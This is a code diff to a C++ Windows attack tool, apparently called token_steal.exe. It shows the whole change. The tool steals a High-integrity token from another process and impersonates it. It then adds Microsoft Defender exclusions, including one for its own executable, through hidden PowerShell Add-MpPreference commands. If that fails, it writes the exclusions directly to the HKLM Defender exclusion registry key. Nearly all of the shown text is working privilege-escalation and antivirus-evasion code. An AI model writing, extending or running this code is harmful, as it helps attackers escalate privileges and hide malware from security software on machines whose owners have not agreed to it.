@@ -15,6 +15,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <sddl.h>
+#include <shellapi.h>
 #include <stdio.h>
 #include <string>
 #include <ctime>
@@ -266,88 +267,114 @@ int main() {
         goto done;
     }
 
-    // Duplicate the token
+    // Duplicate as impersonation token
     INFO("Duplicating token from %s (PID %lu)...", bestName, bestPid);
-    HANDLE hDupToken = nullptr;
+    HANDLE hImpToken = nullptr;
     if (!DuplicateTokenEx(hBestToken,
         TOKEN_ALL_ACCESS, nullptr,
-        SecurityImpersonation, TokenPrimary, &hDupToken)) {
-        WinErr("DuplicateTokenEx");
+        SecurityImpersonation, TokenImpersonation, &hImpToken)) {
+        WinErr("DuplicateTokenEx (impersonation)");
         CloseHandle(hBestToken);
         goto done;
     }
-    CloseHandle(hBestToken);
-    OK("Token duplicated successfully");
+    OK("Impersonation token duplicated");
 
-    // Spawn elevated process with duplicated token
-    INFO("Spawning elevated PowerShell with stolen token...");
+    // Also duplicate as primary for CreateProcessWithTokenW via advapi32 trick
+    HANDLE hPriToken = nullptr;
+    DuplicateTokenEx(hBestToken, TOKEN_ALL_ACCESS, nullptr,
+        SecurityImpersonation, TokenPrimary, &hPriToken);
+    CloseHandle(hBestToken);
+
+    // Impersonate the High integrity token on this thread
+    INFO("Impersonating High integrity token...");
+    if (!ImpersonateLoggedOnUser(hImpToken)) {
+        WinErr("ImpersonateLoggedOnUser");
+        CloseHandle(hImpToken);
+        if (hPriToken) CloseHandle(hPriToken);
+        goto done;
+    }
+    OK("Impersonation active — now running as High integrity");
+
+    // Try to call Add-MpPreference via WMI/COM under the impersonated token
+    // We use ShellExecuteEx which respects the thread token
+    INFO("Running Add-MpPreference under impersonated token...");
     {
-        // The command to run elevated
-        char cmd[] =
-            "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
+        char psCmd[] =
             "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
             "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
             "Add-MpPreference -ExclusionProcess 'token_steal.exe' -Force; "
-            "Write-Output 'Exclusions added' | Out-File C:\\exclusiontest\\exclusion_result.txt"
-            "\"";
+            "Write-Output 'done' | Out-File C:\\exclusiontest\\exclusion_result.txt";
 
-        DBG("Command: %s", cmd);
+        char fullCmd[1024];
+        snprintf(fullCmd, sizeof(fullCmd),
+            "powershell.exe -NoProfile -WindowStyle Hidden -Command \"%s\"", psCmd);
+        DBG("Command: %s", fullCmd);
 
-        STARTUPINFOA si = {};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {};
+        SHELLEXECUTEINFOA sei = {};
+        sei.cbSize = sizeof(sei);
+        sei.fMask  = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+        sei.lpVerb = "runas";
+        sei.lpFile = "powershell.exe";
+        sei.lpParameters =
+            "-NoProfile -WindowStyle Hidden -Command \""
+            "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
+            "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
+            "Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"";
+        sei.nShow = SW_HIDE;
 
-        if (CreateProcessWithTokenW(
-            hDupToken,
-            LOGON_WITH_PROFILE,
-            nullptr,
-            // Convert cmd to wide
-            [&]() -> LPWSTR {
-                static wchar_t wcmd[2048];
-                MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, 2048);
-                return wcmd;
-            }(),
-            CREATE_NO_WINDOW,
-            nullptr, nullptr,
-            (LPSTARTUPINFOW)&si, &pi))
-        {
-            OK("Elevated process spawned (PID %lu)", pi.dwProcessId);
-            INFO("Waiting for it to complete...");
-            WaitForSingleObject(pi.hProcess, 8000);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-
-            // Check result
-            FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
-            if (f) {
-                char buf[256]={};
-                fgets(buf, sizeof(buf), f);
-                fclose(f);
-                OK("Result: %s", buf);
-                OK("SUCCESS — Defender exclusions added!");
-            } else {
-                WARN("Result file not found — exclusion may have failed silently");
-                WARN("Check: Get-MpPreference | Select ExclusionPath");
+        if (ShellExecuteExA(&sei)) {
+            OK("ShellExecuteEx launched (PID via hProcess)");
+            if (sei.hProcess) {
+                WaitForSingleObject(sei.hProcess, 8000);
+                CloseHandle(sei.hProcess);
             }
         } else {
-            WinErr("CreateProcessWithTokenW");
-            // Fallback: try CreateProcessAsUserW
-            INFO("Trying CreateProcessAsUserA fallback...");
-            if (CreateProcessAsUserA(
-                hDupToken, nullptr, cmd, nullptr, nullptr,
-                FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-                OK("Elevated process spawned via CreateProcessAsUserA (PID %lu)", pi.dwProcessId);
-                WaitForSingleObject(pi.hProcess, 8000);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+            WinErr("ShellExecuteEx");
+
+            // Last resort: direct registry write under impersonated token
+            // At High integrity we can write to HKLM Defender exclusions directly
+            INFO("Trying direct registry write to Defender exclusions...");
+            HKEY hKey = nullptr;
+            LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
+                0, KEY_SET_VALUE, &hKey);
+            if (res == ERROR_SUCCESS) {
+                DWORD val = 0;
+                RegSetValueExA(hKey, "C:\\Users\\Public", 0, REG_DWORD,
+                               (const BYTE*)&val, sizeof(val));
+                RegSetValueExA(hKey, "C:\\exclusiontest", 0, REG_DWORD,
+                               (const BYTE*)&val, sizeof(val));
+                RegCloseKey(hKey);
+                OK("Registry exclusions written directly to HKLM Defender!");
+
+                FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
+                if (f) { fprintf(f, "done via registry\n"); fclose(f); }
             } else {
-                WinErr("CreateProcessAsUserA");
+                ERR("RegOpenKeyEx HKLM Defender failed: %ld", res);
             }
         }
-        CloseHandle(hDupToken);
+
+        RevertToSelf();
+        INFO("Reverted impersonation");
     }
+
+    // Check result
+    {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+        if (f) {
+            char buf[256]={};
+            fgets(buf, sizeof(buf), f);
+            fclose(f);
+            OK("Result file contents: %s", buf);
+            OK("SUCCESS — check exclusions with: Get-MpPreference | Select ExclusionPath");
+        } else {
+            WARN("No result file found");
+            WARN("Verify manually: Get-MpPreference | Select ExclusionPath");
+        }
+    }
+
+    if (hImpToken) CloseHandle(hImpToken);
+    if (hPriToken) CloseHandle(hPriToken);
 
 done:
     INFO("Log saved to C:\\exclusiontest\\token_log.txt");
